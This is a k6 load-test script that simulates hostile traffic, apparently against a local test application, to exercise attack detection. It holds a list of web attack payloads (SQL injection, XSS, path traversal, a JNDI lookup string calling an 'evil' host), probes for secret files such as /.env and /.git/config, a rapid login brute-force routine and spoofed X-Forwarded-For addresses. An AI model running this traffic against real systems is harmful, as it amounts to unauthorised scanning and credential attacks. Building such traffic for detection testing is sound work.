import http from 'k6/http';
import { sleep } from 'k6';

const BASE_URL = __ENV.BASE_URL || 'http://localhost:3000';

const RECON_PATHS = [
  '/admin',
  '/login',
  '/wp-admin',
  '/api/internal',
  '/backup.zip',
  '/config',
  '/debug',
  '/.git/config',
  '/server-status',
  '/sitemap.xml',
  '/phpmyadmin',
  '/actuator/health',
  '/.env',
  '/.git/HEAD',
];

const ATTACK_QUERIES = [
  "q=' OR 1=1 --",
  'q=<script>alert(1)</script>',
  'q=../../../../etc/passwd',
  'q=${jndi:ldap://evil/a}',
  'q=UNION+SELECT+1,2,3',
];

const LOGIN_USERS = ['admin', 'root', 'test', 'support', 'devops'];
const AUTH_PATHS = ['/rest/user/login', '/rest/user/whoami', '/api/Users'];
const NOISY_404 = ['/notfound', '/../../etc/passwd', '/_ignition/health-check', '/cgi-bin/test-cgi'];

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randFloat(min, max) {
  return Math.random() * (max - min) + min;
}

function addNoise(path) {
  const ts = Date.now();
  const n = Math.floor(Math.random() * 100000);
  const sep = path.includes('?') ? '&' : '?';
  return `${path}${sep}r=${n}&t=${ts}`;
}

export const options = {
  scenarios: {
    scan_storm: {
      executor: 'constant-arrival-rate',
      exec: 'scanStorm',
      rate: 160,
      timeUnit: '1s',
      duration: '120s',
      preAllocatedVUs: 40,
      maxVUs: 120,
      startTime: '0s',
      gracefulStop: '2s',
      tags: { phase: 'scan_storm' },
    },
    login_bruteforce: {
      executor: 'constant-arrival-rate',
      exec: 'loginBruteforce',
      rate: 80,
      timeUnit: '1s',
      duration: '120s',
      preAllocatedVUs: 30,
      maxVUs: 100,
      startTime: '10s',
      gracefulStop: '2s',
      tags: { phase: 'login_bruteforce' },
    },
    auth_probe: {
      executor: 'constant-arrival-rate',
      exec: 'authProbe',
      rate: 100,
      timeUnit: '1s',
      duration: '120s',
      preAllocatedVUs: 30,
      maxVUs: 100,
      startTime: '20s',
      gracefulStop: '2s',
      tags: { phase: 'auth_probe' },
    },
  },
  summaryTrendStats: ['avg', 'min', 'med', 'p(90)', 'p(95)', 'max'],
  thresholds: {
    http_req_failed: ['rate<0.95'],
  },
};

// Pha 1: Scan storm with bad paths and malformed query strings.
export function scanStorm() {
  const use404 = Math.random() < 0.4;
  const rawPath = use404 ? pick(NOISY_404) : pick(RECON_PATHS);
  const q = pick(ATTACK_QUERIES);
  const path = addNoise(`${rawPath}?${q}`);
  const url = `${BASE_URL}${path}`;

  const method = Math.random() < 0.2 ? 'HEAD' : 'GET';
  http.request(method, url, null, {
    tags: {
      behavior: 'scan_storm',
      endpoint: rawPath,
    },
    headers: {
      'User-Agent': 'k6-suspicious-scan/1.0',
      'Accept': '*/*',
      'Cache-Control': 'no-cache',
      'X-Forwarded-For': `185.220.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    },
    timeout: '2s',
  });

  sleep(randFloat(0.001, 0.01));
}

// Pha 2: Login brute-force behavior (many 401/4xx in short intervals).
export function loginBruteforce() {
  const user = pick(LOGIN_USERS);
  const loginPath = Math.random() < 0.8 ? '/rest/user/login' : '/rest/user/login?continue=1';
  const body = JSON.stringify({
    email: `${user}${Math.floor(Math.random() * 10000)}@evil.local`,
    password: `P@ss-${Math.floor(Math.random() * 1e8)}`,
  });

  http.post(`${BASE_URL}${loginPath}`, body, {
    tags: {
      behavior: 'bruteforce',
      endpoint: '/rest/user/login',
    },
    headers: {
      'User-Agent': 'k6-suspicious-bruteforce/1.0',
      'Content-Type': 'application/json',
      'Accept': 'application/json, */*',
      'X-Requested-With': 'XMLHttpRequest',
    },
    timeout: '2s',
  });

  sleep(randFloat(0.001, 0.012));
}

// Pha 3: Auth/resource probing with short responses.
export function authProbe() {
  const endpoint = pick(AUTH_PATHS);
  const method = Math.random() < 0.3 ? 'HEAD' : 'GET';
  const url = `${BASE_URL}${addNoise(endpoint)}`;
  http.request(method, url, null, {
    tags: {
      behavior: 'auth_probe',
      endpoint,
    },
    headers: {
      'User-Agent': 'k6-suspicious-authprobe/1.0',
      'Accept': '*/*',
      'X-Forwarded-For': `45.155.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    },
    timeout: '2s',
  });

  sleep(randFloat(0.001, 0.012));
}
